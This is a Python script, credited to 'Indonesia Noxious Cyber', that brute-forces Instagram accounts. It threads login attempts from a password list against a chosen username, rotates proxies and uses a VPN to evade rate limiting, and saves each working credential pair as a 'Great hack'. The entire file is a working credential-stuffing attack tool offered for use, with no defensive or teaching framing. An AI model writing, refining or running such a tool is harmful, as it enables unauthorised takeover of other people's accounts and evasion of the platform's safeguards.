from __future__ import print_function
from __future__ import absolute_import
import requests, sys, threading, time, os, random
import json
from colorama import Fore
CheckVersion = str(sys.version)
import re
from datetime import datetime

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"
onlyPasswords = False

print ('''
==============================================
Author      : Anonymous
Initial     : Indonesia Noxious Cyber
==============================================
Depend on vpn. Please use it before running the tool or providing a proxy file!
''')

class InstaBrute(object):
    def __init__(self):

        try:
            user = input('username : ')
            Combo = input('passList : ')
            self.CurrentProxy = ''
            self.UsedProxys = []
            UsePorxy = input('[*] Do you want to use proxy (y/n): ').upper()
            if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                self.randomProxy()

            print('\n----------------------------')

        except:
            print(' The tool was arrested exit ')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)

        if not proxy in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        while 1:
            try:
                print('')
                print(normal_color+'[*] Check new ip...')
                response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
					timeout=10.0).text
                if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
                    print(whiteB_color + '[*] Your public ip: %s' % response)
                    print('')
                    break
                else:
                    continue
            except Exception as e:
                print('[*] Can\'t reach proxy "%s"' % proxy)
                proxy = random.choice(plist)
               
            print('')
			

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "csrf_token": 'DXqibEccwosJBGGL2NlW5VVM6pkkxh6E'
            })

            
            data = json.loads(r.text)
            if 'message' in r.text:
                print('----------------------------')
                print(red_color+'--> not proxy, need a proxy')
                UsePorxy = self.randomProxy()
                print (whiteB_color + 'username: '+ user + ' | '' password: '+ pwd )
                print(r.text)
                print('----------------------------')
            if 'checkpoint_url' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> Great hack '))
                with open('great.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
                    exit()					
            if 'userId' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> Great hack '))
                with open('great.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
                    exit()
            elif 'status' in r.text:
                print (red_color + 'username: '+ user + ' | '' password: '+ pwd )
                print(r.text)
InstaBrute()
